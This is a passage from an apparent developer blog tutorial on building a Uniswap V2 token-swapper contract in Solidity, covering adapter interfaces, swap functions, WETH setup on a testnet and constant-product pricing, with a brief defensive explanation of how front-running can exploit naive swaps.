Contract by accessing the liquidity token with the balance of <code class=\"language-text\">address(this)</code>.</li>\n<li>Calculate the amount of tokens to be withdrawn to the liquidity provider in proportion to how much liquidity the liquidity provider has.</li>\n<li>Burn liquidity and transfer tokens, rewards to liquidity providers are automatically withdrawn with these funds.</li>\n<li>Make sure that the rewards for profits are properly accumulated and you get more than you deposit.</li>\n</ul>\n<h1 id=\"uniswap-swapper-contract-dev--event-data-query-subgraph\" style=\"position:relative;\"><a href=\"#uniswap-swapper-contract-dev--event-data-query-subgraph\" aria-label=\"uniswap swapper contract dev  event data query subgraph permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Swapper Contract Dev + Event Data Query (Subgraph)</h1>\n<ul>\n<li>We are going to develop a simple swap contract focusing on each contract function described above.</li>\n<li>With reference to the SDK provided by Uniswap, the dependency management of contracts configured by function is carried out.</li>\n<li>Finally, the Uniswap Liquidity Pool performs the swapping function for each coin, and manages the liquidity pool based on CPMM. Tokens that will be used for deposit and reserve in the pool will be swapped in the form of ETH, DAI, and UDSC by selecting a pair of ‘DAI, USDC’ ERC20 tokens placed on the Ethereum chain.</li>\n<li>The overall contract is going to be distributed on the Ethereum test net, and event data collection and handling are also carried out by locally turning a subgraph node that triggers each event issued by the transaction call of the deployed contract.</li>\n</ul>\n<h3 id=\"contract-dependencies\" style=\"position:relative;\"><a href=\"#contract-dependencies\" aria-label=\"contract dependencies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contract Dependencies</h3>\n<ul>\n<li>Uniswap contract dependency <code class=\"language-text\">@uniswap/sdk</code> is used as follows, and it is used as a transaction utility when writing deployment scripts and test codes.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">yarn add @uniswap<span class=\"token operator\">/</span>sdk</code></pre></div>\n<h3 id=\"interface\" style=\"position:relative;\"><a href=\"#interface\" aria-label=\"interface permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Interface</h3>\n<ul>\n<li>First, we will design the contract interface to proceed with the function definition.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">IAdapter\nIAsset \nISwapper\nIUniswapV2Pair\nIUniswapV2Router01\nIUniswapV2Router02\nIWETH</code></pre></div>\n<p><strong>Interface Adapter</strong></p>\n<ul>\n<li>Adaptar contracts can be designed to facilitate liquidity management and multi-pair trade function management can do.</li>\n<li>The core function in this contract is <code class=\"language-text\">swapExactTokensForTokens</code> among the methods of Uniswap Router Contract. Swapping according to the specified amount is executed by referring to the instance of each token specified by <code class=\"language-text\">path</code>.</li>\n</ul>\n<blockquote>\n<p>IAdapter.sol ⇒ (UniswapV2Adapter.sol : swapExactInputSingle)</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">function</span> <span class=\"token function\">swapExactInputSingle</span><span class=\"token punctuation\">(</span>\n    <span class=\"token builtin\">uint256</span> routerId<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> amountIn<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> amountOut<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> srcToken<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> destToken<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> deadline\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amountSwapped<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>routers<span class=\"token punctuation\">[</span>routerId<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERR-01\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IUniswapV2Router02 router <span class=\"token operator\">=</span> <span class=\"token function\">IUniswapV2Router02</span><span class=\"token punctuation\">(</span>routers<span class=\"token punctuation\">[</span>routerId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IERC20 tokenToSell <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>srcToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    swapper<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>tokenToSell<span class=\"token punctuation\">,</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amountIn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> path <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    path<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>srcToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    path<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>destToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>tokenToSell<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>router<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amountIn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    amountSwapped <span class=\"token operator\">=</span> router<span class=\"token punctuation\">.</span><span class=\"token function\">swapExactTokensForTokens</span><span class=\"token punctuation\">(</span>\n        amountIn<span class=\"token punctuation\">,</span>\n        amountOut<span class=\"token punctuation\">,</span>\n        path<span class=\"token punctuation\">,</span>\n        to<span class=\"token punctuation\">,</span>\n        deadline\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>The operation is carried out for the token pair to be swapped, and only for each of the two token pairs. Returns the swapped amount of the swapped token pair.</li>\n</ul>\n<p>✅ The address value of routers[routerId] must not be 0x0, that is, a valid address must be assigned.</p>\n<ul>\n<li>For ERC20 token, type cast srcToken and destToken respectively and send to the destination address.</li>\n<li>To proceed with the two token pairs, refer to each address address to assign a value, then refer to the address of the corresponding router to confirm whether it is usable or not, and finally proceed with swapping.</li>\n</ul>\n<blockquote>\n<p>IAdapter.sol ⇒ (UniswapV2Adapter.sol: swapExactInput)</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">function</span> <span class=\"token function\">swapExactInput</span><span class=\"token punctuation\">(</span>\n    <span class=\"token builtin\">uint256</span> routerId<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> amountIn<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> amountOut<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> path<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> deadline\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> amounts<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>routers<span class=\"token punctuation\">[</span>routerId<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERR-01\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IUniswapV2Router02 router <span class=\"token operator\">=</span> <span class=\"token function\">IUniswapV2Router02</span><span class=\"token punctuation\">(</span>routers<span class=\"token punctuation\">[</span>routerId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IERC20 tokenToSell <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    swapper<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>tokenToSell<span class=\"token punctuation\">,</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amountIn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>tokenToSell<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>router<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amountIn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    amounts <span class=\"token operator\">=</span> router<span class=\"token punctuation\">.</span><span class=\"token function\">swapExactTokensForTokens</span><span class=\"token punctuation\">(</span>\n        amountIn<span class=\"token punctuation\">,</span>\n        amountOut<span class=\"token punctuation\">,</span>\n        path<span class=\"token punctuation\">,</span>\n        to<span class=\"token punctuation\">,</span>\n        deadline\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Same function as the previous function, but supports multiple tokens to be swapped.</li>\n</ul>\n<blockquote>\n<p>AdapterStorage.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AdapterStorage</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> routers<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">registerRouter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> routerId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> routerAddress<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        onlyOwner\n    <span class=\"token punctuation\">{</span>\n        routers<span class=\"token punctuation\">[</span>routerId<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> routerAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>The main function of the adapter must be in charge of the uniswap router security element. The following <code class=\"language-text\">registerRouter</code> function manages the router address for each increase in the routers mapping structure, and it should be able to allocate only each approved data in fact. did.</li>\n</ul>\n<h3 id=\"interface-asset\" style=\"position:relative;\"><a href=\"#interface-asset\" aria-label=\"interface asset permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Interface Asset</h3>\n<ul>\n<li>This contract can design ERC20 compliant token contracts or functions used to express ETH. Since it is not used in the current Uniswap Liquidity Pool Swapping function, I will only allocate it with an empty contract.</li>\n</ul>\n<h3 id=\"interface-uniswapv2pair\" style=\"position:relative;\"><a href=\"#interface-uniswapv2pair\" aria-label=\"interface uniswapv2pair permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Interface UniswapV2Pair</h3>\n<ul>\n<li>You can check the total liquidity supply of the pair and the token balance. You need to insert it into a separate function and proceed.</li>\n</ul>\n<p>✅ Each contract dependency must be configured based on the deployed pair contract’s address instance.</p>\n<p>✅ Each asset must exist in the Pair Contract.</p>\n<p>✅ Get the total supply of Pair Liquidity.</p>\n<p>✅ Reserves should be sorted in the order of tokenA and tokenB.</p>\n<ul>\n<li>Utilize the <code class=\"language-text\">getReserves</code> method and return the reserves of token0 and token1, which are used to set the transaction price and distribute liquidity. Returns <code class=\"language-text\">block.timestamp(mod 2**32)</code> of the last block in which the interaction occurred for the Pair.</li>\n</ul>\n<h3 id=\"interface-weth\" style=\"position:relative;\"><a href=\"#interface-weth\" aria-label=\"interface weth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Interface WETH</h3>\n<ul>\n<li>In order to directly transact with other altcoins outside the ERC-20 standard protocol, wrapping is required during the swapping process.</li>\n<li>In order to exchange ERC-20 tokens and Ether on a decentralized platform such as Radar Relay, and since it provides direct transactions between users using Ethereum smart contracts, all users receive the same tokens for all tokens traded. standards must be maintained.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">Utils</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">enum</span> <span class=\"token class-name\">SwapType</span> <span class=\"token punctuation\">{</span>\n      GIVEN_IN<span class=\"token punctuation\">,</span>\n      GIVEN_OUT\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> WETH <span class=\"token operator\">=</span>\n      <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xc778417E063141139Fce010982780140Aa0cD5Ab</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> ETH <span class=\"token operator\">=</span>\n      <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><a href=\"https://rinkeby.etherscan.io/address/0xc778417e063141139fce010982780140aa0cd5ab#code\">https://rinkeby.etherscan.io/address/0xc778417e063141139fce010982780140aa0cd5ab#code</a></p>\n<ul>\n<li>In order to refer to the WETH9 Contract distributed on the test net and use it, I implemented one for the corresponding access purpose.</li>\n</ul>\n<h2 id=\"swapper-contract-design\" style=\"position:relative;\"><a href=\"#swapper-contract-design\" aria-label=\"swapper contract design permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Swapper Contract Design</h2>\n<ul>\n<li>We designed the basic utility and dependency interface before, and now we will implement the code level to perform the swapping function, which is the main contract.</li>\n<li>In this contract, wrapper with WETH, multi- and single-swap functions are implemented.</li>\n</ul>\n<h3 id=\"how-to-pricing-a-transaction\" style=\"position:relative;\"><a href=\"#how-to-pricing-a-transaction\" aria-label=\"how to pricing a transaction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to Pricing a Transaction</h3>\n<ul>\n<li>Each pair of Uniswap is actually backed by a liquidity pool.</li>\n<li>A liquidity pool is a smart contract that holds the balance of two unique tokens and enforces rules related to depositing and withdrawing them, and the basic rule is the constant product formula (X * Y = K).</li>\n<li>When you buy a token, you need to sell a proportionate amount to keep it constant.</li>\n<li>The token rate in the pool, along with a certain product formula, ultimately determines the price at which the swap is executed.</li>\n</ul>\n<h3 id=\"how-uniswap-handles-pricing\" style=\"position:relative;\"><a href=\"#how-uniswap-handles-pricing\" aria-label=\"how uniswap handles pricing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How Uniswap Handles Pricing</h3>\n<ul>\n<li>In v1, a transaction is always executed at the “best” price calculated at run time, and the calculation is actually done in one of two formulas depending on whether the transaction specifies an exact input or output amount.</li>\n<li>Functionally, the difference between these two functions is negligible, but the existence of the difference itself increases the conceptual complexity.</li>\n<li>Initial attempts to support both features in V2 were inappropriate and decided not to offer price features in Core</li>\n</ul>\n<p>Instead, the pair directly checks whether the invariant is satisfied after every trade.</p>\n<ul>\n<li>Enforce immutability rather than relying on pricing features and V2 pairs are simple and transparent to ensure their own safety and good separation of concerns.</li>\n<li>One downstream advantage is that it more naturally supports other types of trades where V2 pairs can appear.</li>\n</ul>\n<h3 id=\"price-trading\" style=\"position:relative;\"><a href=\"#price-trading\" aria-label=\"price trading permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>price trading</h3>\n<ul>\n<li>When exchanging tokens on Uniswap, it is common to either receive as many output tokens as possible for the correct input amount or pay as few input tokens as possible for the correct output amount.</li>\n<li>To calculate these amounts, the contract needs to look up the pair’s current reserve to understand what the current price is.</li>\n<li>It is not safe to perform a lookup and rely on results without access to external prices.</li>\n<li>Let’s say the contract naively sends 10 DAI to a DAI/WETH pair and wants to receive as much WETH as it can get given the current reserve ratio.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token operator\">></span> When a <span class=\"token keyword\">pure</span> smart <span class=\"token keyword\">contract</span> <span class=\"token class-name\">is</span> invoked<span class=\"token punctuation\">,</span> simply querying the current price and executing a transaction<span class=\"token operator\">?</span>\n<span class=\"token operator\">=></span> Vulnerable to FlashAttack and likely to suffer economic loss<span class=\"token punctuation\">.</span>\n<span class=\"token operator\">=></span> We have to think about the malicious actor who sees <span class=\"token keyword\">this</span> transaction before it <span class=\"token keyword\">is</span> confirmed in the transaction<span class=\"token punctuation\">.</span>\n<span class=\"token operator\">=></span> You can execute a swap that dramatically changes the DAI<span class=\"token operator\">/</span>WETH price just before the naive swap<span class=\"token punctuation\">.</span>\n<span class=\"token operator\">=></span> You can change the price back to what it was before the naive swap by waiting <span class=\"token keyword\">for</span> the naive swap to run at a bad rate and then swapping\n<span class=\"token operator\">=></span> This attack <span class=\"token keyword\">is</span> fairly cheap<span class=\"token punctuation\">,</span> low risk<span class=\"token punctuation\">,</span> and can usually be done <span class=\"token keyword\">for</span> profit<span class=\"token punctuation\">.</span></code></pre></div>\n<ul>\n<li>To prevent the above attack, it is important to submit a swap with access to information about the “fair” price at which the swap should be executed.</li>\n<li>Swap must be accessible to Oracle to ensure that the best practices you can get from Uniswap are close enough to what Oracle considers the “true” price.</li>\n</ul>\n<p>An oracle could be as simple as an off-chain observation of a pair’s current market price.</p>\n<ul>\n<li>Due to arbitrage, the reserve ratio within a pair of blocks is usually close to the “true” market price.</li>\n<li>Therefore, if users submit transactions with this knowledge in mind, it is possible to ensure that losses from flash loan attacks are strictly limited.</li>\n<li>Logic can be safely implemented client-side, and given the observed in-block price, calculate the optimal amount of input/output and perform swap using router</li>\n<li>Guarantees that the swap will run at a rate that is at least % worse than the observed in-block rate of <code class=\"language-text\">X</code>.</li>\n</ul>\n<h3 id=\"state-variables\" style=\"position:relative;\"><a href=\"#state-variables\" aria-label=\"state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variables</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeERC20</span> <span class=\"token keyword\">for</span> IERC20<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// ...</span>\n\n<span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> adapters<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">SwapStep</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> adapterId<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> routerId<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token 